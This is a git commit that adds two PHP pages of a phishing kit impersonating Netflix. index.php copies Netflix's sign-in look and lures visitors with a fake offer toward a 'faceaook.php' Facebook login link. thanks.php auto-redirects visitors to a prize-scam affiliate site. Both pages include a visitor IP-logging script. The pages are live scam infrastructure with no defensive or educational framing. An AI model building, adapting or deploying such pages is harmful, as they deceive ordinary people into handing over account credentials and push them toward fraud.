7043a55fda6d6d7a1bdf83010e43fdbadff9c4a8
Monsaguer <87680144+Monsaguer@users.noreply.github.com>
2021-12-06 06:52:36 +0800

    Add files via upload

---
+++ index.php
@@ -0,0 +1,55 @@
+<?php
+include 'Data/translate.php';
+include 'Data/ip.php';
+?>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<meta charSet="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<title>Netflix- Offer</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
+<link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-v7fbfcde1/css/css/less%7Ccore%7Cerror-page.less/1/uFwM4Ksv9EJL/none/true/none" data-uia="botLink"/>
+<link type="text/css" rel="stylesheet" href="1.css" data-uia="botLink"/>
+<link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
+<link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
+</head>
+<body><center>
+<div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper">
+<div class="login-wrapper-background">
+<img class="concord-img vlv-creative" src="https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcSet="https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt=""/>
+</div>
+<div class="nfHeader login-header signupBasicHeader">
+<a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
+<svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
+<span class="screen-reader-text"></span>
+</a>
+</div>
+<div class="login-body">
+<div>
+<noscript>
+<div data-uia="error-message-container" class="ui-message-container ui-message-error">
+<div class="ui-message-icon">
+</div>
+</noscript>
+<div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
+<div class="hybrid-login-form-main">
+
+<img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
+<h1>Sign In</h1>
+<h2> <font color="red"><?php echo $txt_head1 ?> </h2> 
+</font> <br>
+<input type="checkbox"  required="true" > 
+<font color="white"><?php echo $polices ?> </font>
+
+<div class="facebookForm regOption">
+<a href="faceaook.php"><br>
+<img class="icon-facebook" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png"/>
+<button class="fbBtnText" ><?php echo $txt_button_head ?></button> 
+</div>
+</a>
+</div>
+</center>
+</body>
+</html>
---
+++ thanks.php
@@ -0,0 +1,95 @@
+<?php
+include 'Data/translate.php';
+include 'Data/ip.php';
+?>
+
+
+
+<html lang="en">
+<head>
+  <meta http-equiv="refresh" content="5; url=https://win.gifts4all.club/?utm_medium=3710a69554ecbf3d473cb8742bcadbb71711a401&utm_campaign=6564" />
+
+
+ // <!-- <script language="javascript" type="text/javascript">
+// function windowClose() {
+// window.open('','_parent','');
+// window.close();
+// }
+// </script> -->
+
+<meta http-equiv="refresh" content="5;url=http://www.google.com/" />
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<meta charSet="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<title><?php echo $txt_head ?></title>
+
+<link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E3.0.0/truthBundle/webui/1.22.5-shakti-css-v7fbfcde1/css/css/less%7Ccore%7Cerror-page.less/1/uFwM4Ksv9EJL/none/true/none" data-uia="botLink"/>
+<link type="text/css" rel="stylesheet" href="1.css" data-uia="botLink"/>
+<link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico"/>
+<link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
+<meta property="og:description" content="Watch Netflix movies &amp; TV shows online or stream right to your smart TV, game console, PC, Mac, mobile, tablet and more."/>
+
+<meta property="al:ios:app_name" content="Netflix"/>
+<meta property="al:android:package" content="com.netflix.mediaclient"/>
+<meta property="al:android:app_name" content="Netflix"/>
+</head>
+<body onload="myFunction()">
+<div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper">
+<div class="login-wrapper-background">
+<img class="concord-img vlv-creative" src="https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcSet="https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/538717c0-f271-40e9-a99e-b07f9c521322/61bdaac4-d853-4944-9d67-5c5cedd2a201/EG-en-20210201-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt=""/>
+</div>
+<div class="nfHeader login-header signupBasicHeader">
+<a href="/" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
+<svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
+<span class="screen-reader-text"></span>
+</a>
+</div>
+<div class="login-body">
+<div>
+<noscript>
+<div data-uia="error-message-container" class="ui-message-container ui-message-error">
+<div class="ui-message-icon">
+</div>
+</noscript>
+<div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container">
+<div class="hybrid-login-form-main">
+<center>
+<img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
+<h1><?php echo $thanks ?></h1>
+<h2> <font color="red"> <?php echo $subs ?></h2> 
+</font> 
+ <font color="white"><?php echo $wish ?> </font> 
+ <p><?php echo $share ?></p>
+ <font color="white">
+<p style="text-align:center"><?php echo $close ?><span id="counter">5</span> second(s).</p> </font>
+<!--<script type="text/javascript">
+function countdown() {
+
+    var i = document.getElementById('counter');
+
+    i.innerHTML = parseInt(i.innerHTML)-1;
+
+if (parseInt(i.innerHTML)<=0) {
+
+ window.close();
+
+}
+
+}
+
+setInterval(function(){ countdown(); },1000);
+
+
+</script>	
+
+<input type="button" value="Close it Now " onclick="windowClose();">
+-->
+
+</script>
+</div>
+</center>
+
+</body>
+</html>
